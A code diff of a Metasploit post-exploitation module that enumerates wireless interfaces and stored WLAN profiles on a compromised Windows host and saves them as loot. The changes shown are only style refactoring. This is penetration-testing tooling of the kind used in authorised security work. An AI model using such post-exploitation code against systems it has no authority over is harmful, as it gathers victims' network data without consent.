@@ -40,16 +40,16 @@ class MetasploitModule < Msf::Post
     @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
     @wlanapi = client.railgun.wlanapi
     wlan_info = "Wireless LAN Profile Information \n"
-    wlan_handle = open_handle()
+    wlan_handle = open_handle
     unless wlan_handle
       print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
-      print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
+      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')
       return
     end
     wlan_iflist = enum_interfaces(wlan_handle)
 
     if wlan_iflist.empty?
-      print_status("No wireless interfaces")
+      print_status('No wireless interfaces')
       return
     end
 
@@ -66,23 +66,23 @@ class MetasploitModule < Msf::Post
       end
     end
     # strip the nullbytes out of the text for safe outputting to loot
-    wlan_info.gsub!(/\x00/, "")
+    wlan_info.gsub!(/\x00/, '')
     print_good(wlan_info)
-    store_loot("host.windows.wlan.profiles", "text/plain", session, wlan_info, "wlan_profiles.txt", "Wireless LAN Profiles")
+    store_loot('host.windows.wlan.profiles', 'text/plain', session, wlan_info, 'wlan_profiles.txt', 'Wireless LAN Profiles')
 
     # close the Wlan API Handle
     closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)
     if closehandle['return'] == 0
-      print_status("WlanAPI Handle Closed Successfully")
+      print_status('WlanAPI Handle Closed Successfully')
     else
-      print_error("There was an error closing the Handle")
+      print_error('There was an error closing the Handle')
     end
   end
 
   def open_handle
     begin
       wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)
-    rescue
+    rescue StandardError
       return nil
     end
     return wlhandle['phClientHandle']
@@ -92,13 +92,13 @@ class MetasploitModule < Msf::Post
     iflist = @wlanapi.WlanEnumInterfaces(wlan_handle, nil, 4)
     pointer = iflist['ppInterfaceList']
     numifs = @host_process.memory.read(pointer, 4)
-    numifs = numifs.unpack("V")[0]
+    numifs = numifs.unpack('V')[0]
     interfaces = []
     return [] if numifs.nil?
 
     # Set the pointer ahead to the first element in the array
     pointer = (pointer + 8)
-    (1..numifs).each do |i|
+    (1..numifs).each do |_i|
       interface = {}
       # Read the GUID (16 bytes)
       interface['guid'] = @host_process.memory.read(pointer, 16)
@@ -111,26 +111,26 @@ class MetasploitModule < Msf::Post
       pointer = (pointer + 4)
 
       # Turn the state into human readable form
-      state = state.unpack("V")[0]
+      state = state.unpack('V')[0]
       case state
       when 0
-        interface['state'] = "The interface is not ready to operate."
+        interface['state'] = 'The interface is not ready to operate.'
       when 1
-        interface['state'] = "The interface is connected to a network."
+        interface['state'] = 'The interface is connected to a network.'
       when 2
-        interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
+        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'
       when 3
-        interface['state'] = "The interface is disconnecting from the current network."
+        interface['state'] = 'The interface is disconnecting from the current network.'
       when 4
-        interface['state'] = "The interface is not connected to any network."
+        interface['state'] = 'The interface is not connected to any network.'
       when 5
-        interface['state'] = "The interface is attempting to associate with a network."
+        interface['state'] = 'The interface is attempting to associate with a network.'
       when 6
-        interface['state'] = "Auto configuration is discovering the settings for the network."
+        interface['state'] = 'Auto configuration is discovering the settings for the network.'
       when 7
-        interface['state'] = "The interface is in the process of authenticating."
+        interface['state'] = 'The interface is in the process of authenticating.'
       else
-        interface['state'] = "Unknown State"
+        interface['state'] = 'Unknown State'
       end
       interfaces << interface
     end
@@ -142,9 +142,9 @@ class MetasploitModule < Msf::Post
     proflist = @wlanapi.WlanGetProfileList(wlan_handle, guid, nil, 4)
     ppointer = proflist['ppProfileList']
     numprofs = @host_process.memory.read(ppointer, 4)
-    numprofs = numprofs.unpack("V")[0]
+    numprofs = numprofs.unpack('V')[0]
     ppointer = (ppointer + 8)
-    (1..numprofs).each do |j|
+    (1..numprofs).each do |_j|
       profile = {}
       # Read the profile name (up to 512 bytes)
       profile['name'] = @host_process.memory.read(ppointer, 512)
@@ -172,10 +172,10 @@ class MetasploitModule < Msf::Post
 
   # Convert the GUID to human readable form
   def guid_to_string(guid)
-    aguid = guid.unpack("H*")[0]
-    sguid = "{" + aguid[6, 2] + aguid[4, 2] + aguid[2, 2] + aguid[0, 2]
-    sguid << "-" + aguid[10, 2] + aguid[8, 2] + "-" + aguid[14, 2] + aguid[12, 2] + "-" + aguid[16, 4]
-    sguid << "-" + aguid[20, 12] + "}"
+    aguid = guid.unpack('H*')[0]
+    sguid = '{' + aguid[6, 2] + aguid[4, 2] + aguid[2, 2] + aguid[0, 2]
+    sguid << '-' + aguid[10, 2] + aguid[8, 2] + '-' + aguid[14, 2] + aguid[12, 2] + '-' + aguid[16, 4]
+    sguid << '-' + aguid[20, 12] + '}'
     return sguid
   end
 end
